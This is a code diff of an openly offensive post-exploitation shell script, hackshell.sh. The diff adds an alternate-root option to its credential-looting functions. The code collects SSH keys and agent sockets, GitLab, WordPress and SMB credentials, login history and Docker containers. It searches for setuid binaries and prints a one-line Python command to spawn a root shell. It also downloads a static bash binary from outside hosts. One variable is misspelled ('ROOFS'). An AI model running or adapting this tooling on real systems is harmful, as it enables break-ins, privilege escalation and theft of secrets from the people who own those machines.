@@ -17,8 +17,9 @@
 # Environment variables (optional):
 #    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
 #    HOMEDIR=       Loot location of /home [default: /home]
+#    ROOTFS=        Set different root. [default: /]
 #
-# 2024 by Messede, DoomeD, skpr
+# 2024-2025 by Messede, DoomeD, skpr
 
 _HSURL="https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh"
 _HSURLORIGIN=
@@ -41,6 +42,14 @@ _hs_init_color() {
     CN="\033[0m"    # none
     CW="\033[1;37m" # white
     CUL="\e[4m"
+}
+
+_hs_init_rootfs() {
+    [ -z "$ROOTFS" ] && return
+    [ -d "$ROOTFS" ] && return
+
+    HS_WARN "Directory not found (ROOTFS=): ${ROOTFS}"
+    unset ROOTFS
 }
 
 # Disable colors if this is not a TTY
@@ -1079,18 +1088,21 @@ _warn_rk() {
 _hs_gen_home() {
     local IFS
     local str
+    local fn
     unset HOMEDIRARR
 
     if [ -n "$HOMEDIR" ]; then
-        if [ -d "$HOMEDIR" ]; then
-            str="$({ find "${HOMEDIR}" -mindepth 1 -maxdepth 1 -type d; } | sort -u)"
+        if [ -d "${ROOTFS}${HOMEDIR}" ]; then
+            str="$({ find "${ROOTFS}${HOMEDIR}" -mindepth 1 -maxdepth 1 -type d; } | sort -u)"
         else
-            HS_WARN "Directory not found: HOMEDIR='${HOMEDIR}'"
+            HS_WARN "Directory not found: HOMEDIR='${ROOTFS}${HOMEDIR}'"
         fi
+        fn="${ROOTFS}/root"
+        [ -d "$fn" ] && str+="$fn"$'\n'
     else
         # str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; [ -d /var/www ] && echo "/var/www"; } | sort -u)"
-        str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ ! -d "$d" ] && continue; [[ "$d" == "/" || "$d" == "/bin" || "$d" == "/sbin" ]] && continue; echo "$d"; done; } | sort -u)"
-        [ -d /var/www ] && [[ "$str" != *"/var/www"* ]] && str+="/var/www"$'\n'
+        str="$({ find "${ROOTFS}${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d 2>/dev/null; cat "${ROOTFS}/etc/passwd" 2>/dev/null | awk -F':' '{print $6}' 2>/dev/null | while read -r d; do [ ! -d "${ROOTFS}$d" ] && continue; [[ "$d" == "/" || "$d" == "/bin" || "$d" == "/sbin" ]] && continue; echo "${ROOTFS}$d"; done; } | sort -u)"
+        [ -d "${ROOTFS}/var/www" ] && [[ "$str" != *"/var/www"* ]] && str+="${ROOTFS}/var/www"$'\n'
     fi
 
     set -f
@@ -1100,11 +1112,11 @@ _hs_gen_home() {
 
 lootlight() {
     local str
-    ls -al /tmp/ssh-* &>/dev/null && {
+    ls -al "${ROOTFS}"/tmp/ssh-* &>/dev/null && {
         echo -e "${CB}SSH_AUTH_SOCK${CDY}${CF}"
-        find /tmp -name 'agent.*' | while read -r fn; do
+        find "${ROOFS}"/tmp -name 'agent.*' | while read -r fn; do
             unset str
-            command -v lsof >/dev/null && lsof "$fn" &>/dev/null && str="[ACTIVE]"
+            command -v lsof >/dev/null && lsof -n "$fn" &>/dev/null && str="[ACTIVE]"
             echo "$(ls -al "$fn")"$'\t'"${str}"
         done
         echo -e "${CN}"
@@ -1112,7 +1124,7 @@ lootlight() {
 
     [ "$UID" -ne 0 ] && {
         unset str
-        str="$(find /var/tmp /tmp -maxdepth 2 -uid 0  -perm /u=s -ls 2>/dev/null)"
+        str="$(find "${ROOTFS}"/var/tmp "${ROOTFS}"/tmp -maxdepth 2 -uid 0  -perm /u=s -ls 2>/dev/null)"
         [ -n "$str" ] && {
             echo -e "${CB}B00M-SHELL ${CDY}${CF}"
             echo "${str}"
@@ -1120,7 +1132,7 @@ lootlight() {
             echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
         }
 
-        str="$( { readlink -f /lib64/ld-*.so.* || readlink -f /lib/ld-*.so.* || readlink -f /lib/ld-linux.so.2; } 2>/dev/null )"
+        str="$( { readlink -f "${ROOTFS}"/lib64/ld-*.so.* || readlink -f "${ROOTFS}"/lib/ld-*.so.* || readlink -f "${ROOTFS}"/lib/ld-linux.so.2; } 2>/dev/null )"
         [ -f "$str" ] && getcap "$str" 2>/dev/null | grep -qFm1 cap_setuid 2>/dev/null && {
             echo -e "${CB}B00M-SHELL ${CDY}${CF}"
             getcap "${str}" 2>/dev/null
@@ -1156,8 +1168,41 @@ lootlight() {
     _warn_rk
 }
 
+_lootmore_last() {
+    command -v last >/dev/null || return
+    if [ -z "${ROOTFS}" ]; then
+        echo -e "${CB}Last Logins ${CDY}${CF}"
+        last -i -n20 2>/dev/null
+    else
+        fn="${ROOTFS}/var/log/wtmp"
+        [ ! -s "${fn}" ] && return
+        echo -e "${CB}Last Logins ${CDY}${CF}"
+        last -i -n20 -f "${fn}" 2>/dev/null
+    fi
+    echo -en "${CN}"
+}
+
+_lootmore_docker() {
+    local fn
+
+    command -v docker >/dev/null || return
+    [ -n "$ROOTFS" ] && {
+        fn="${ROOTFS}/var/run/docker.sock"
+        [ ! -e "$fn" ] && return
+        DOCKER_HOST="unix://${fn}"
+    }
+    str="$(DOCKER_HOST="${DOCKER_HOST}" docker ps -a)"
+    [ -z "$str" ] && return
+
+    echo -e "${CB}Docker ${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+}
+
 lootmore() {
     local hn fn str arr
+
+    _hs_init_rootfs
     _hs_gen_home
 
     # Find interesting commands in history file
@@ -1174,58 +1219,47 @@ lootmore() {
         echo -en "${CN}"
     done
 
-    command -v lastlog >/dev/null && {
-        echo -e "${CB}Logins ${CDY}${CF}"
-        lastlog 2>/dev/null | grep -vF 'Never logged'
-        echo -en "${CN}"
-    }
-    command -v last >/dev/null && {
-        echo -e "${CB}Last Logins ${CDY}${CF}"
-        last -i -n20 2>/dev/null
-        echo -en "${CN}"
-    }
-
-    str="$(dmesg -T 2>/dev/null | tail -n 10)"
-    [ -n "$str" ] && {
-        echo -e "${CB}dmesg ${CDY}${CF}"
-        echo "$str"
-        echo -en "${CN}"
-    }
-
-    command -v docker >/dev/null && {
-        str="$(docker ps -a)"
+    [ -z "${ROOTFS}" ] && {
+        str="$(dmesg -T 2>/dev/null | tail -n 10)"
         [ -n "$str" ] && {
-            echo -e "${CB}Docker ${CDY}${CF}"
+            echo -e "${CB}dmesg ${CDY}${CF}"
             echo "$str"
             echo -en "${CN}"
         }
-    }
-    # Execute in subshell so that 'source' does not mess with our variables.
-    (source /etc/apache2/envvars 2>/dev/null && {
-        unset str
-        set -f
-        IFS=$'\n' arr=($(ps auxw|awk '{print $11}'|grep -e "[a]pache" -e "[h]ttpd"|grep -v lighttpd|sort -u))
-        set +f
-        for b in "${arr[@]}"; do
-            grep -Fqs apr_socket_timeout_set "$b" || continue
-            str+="$("$b" -t -D DUMP_VHOSTS 2>&1)" || continue
-        done
-        [ -n "$str" ] && {
-            echo -e "${CB}Apache Config ${CDY}${CF}"
-            echo "$str"
+        command -v lastlog >/dev/null && {
+            echo -e "${CB}Logins ${CDY}${CF}"
+            lastlog 2>/dev/null | grep -vF 'Never logged'
             echo -en "${CN}"
         }
-    })
+        # Execute in subshell so that 'source' does not mess with our variables.
+        (source "${ROOTFS}/etc/apache2/envvars" 2>/dev/null && {
+            unset str
+            set -f
+            IFS=$'\n' arr=($(ps auxw|awk '{print $11}'|grep -e "[a]pache" -e "[h]ttpd"|grep -v lighttpd|sort -u))
+            set +f
+            for b in "${arr[@]}"; do
+                grep -Fqs apr_socket_timeout_set "$b" || continue
+                str+="$("$b" -t -D DUMP_VHOSTS 2>&1)" || continue
+            done
+            [ -n "$str" ] && {
+                echo -e "${CB}Apache Config ${CDY}${CF}"
+                echo "$str"
+                echo -en "${CN}"
+            }
+        })
+    }
+    _lootmore_last
+    _lootmore_docker
 
-    str="$(grep -sE '^[[:digit:]]' /etc/hosts |grep -vF -e localhost -e 127.0.0.1)"
+    str="$(grep -sE '^[[:digit:]]' "${ROOTFS}/etc/hosts" |grep -vF -e localhost -e 127.0.0.1)"
     [ -n "$str" ] && {
-        echo -e "${CB}/etc/hosts ${CDY}${CF}"
+        echo -e "${CB}${ROOTFS}/etc/hosts ${CDY}${CF}"
         echo "$str"
         echo -en "${CN}"
     }
 
     unset HOMEDIRARR
-    echo -e "${CW}TIP:${CN} Type ${CDC}ws${CN} to find out more about this host."
+    [ -z "$ROOTFS" ] && echo -e "${CW}TIP:${CN} Type ${CDC}ws${CN} to find out more about this host."
 }
 
 # <NAME> <COMMAND> ...
@@ -1250,6 +1284,7 @@ loot() {
     local h="${_HS_HOME_ORIG:-$HOME}"
     local str hn fn
 
+    _hs_init_rootfs
     _hs_gen_home
     unset _HS_GOT_SSRF_169
     
@@ -1277,22 +1312,24 @@ loot() {
         loot_bitrix "$fn"
     done
 
-    loot_gitlab /opt/gitlab/etc/gitlab-psql-rc
-    loot_gitlab /etc/gitlab-psql-rc
+    loot_gitlab "${ROOTFS}/opt/gitlab/etc/gitlab-psql-rc"
+    loot_gitlab "${ROOTFS}/etc/gitlab-psql-rc"
 
     find "${HOMEDIRARR[@]}" -maxdepth 4 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
         _loot_wp "$fn"
     done
 
     ### SSH Keys
-    [ -e "/etc/ansible/ansible.cfg" ] && {
-        str="$(grep ^private_key_file "/etc/ansible/ansible.cfg" 2>/dev/null)"
+    [ -e "${ROOTFS}/etc/ansible/ansible.cfg" ] && {
+        str="$(grep ^private_key_file "${ROOTFS}/etc/ansible/ansible.cfg" 2>/dev/null)"
         s="${str##*= }"
         loot_sshkey "$s"
     }
 
-    for fn in "${HOMEDIR:-/home}"/*/.ssh/* /root/.ssh/*; do
-        loot_sshkey "$fn"
+    for hn in "${HOMEDIRARR[@]}"; do
+        for fn in "${hn}"/.ssh/*; do
+            loot_sshkey "$fn"
+        done
     done
 
     _loot_homes "SMB"    ".smbcredentials"
@@ -1520,6 +1557,8 @@ hs_init() {
     local a
     local prg="$1"
     local str
+
+    _hs_init_rootfs
     [ -z "$BASH" ] && {
         str="https://bin.ajam.dev/$(uname -m)/bash"
         [[ "$(uname -m)" == i686 ]] && str='https://github.com/polaco1782/linux-static-binaries/raw/refs/heads/master/x86-i686/bash'
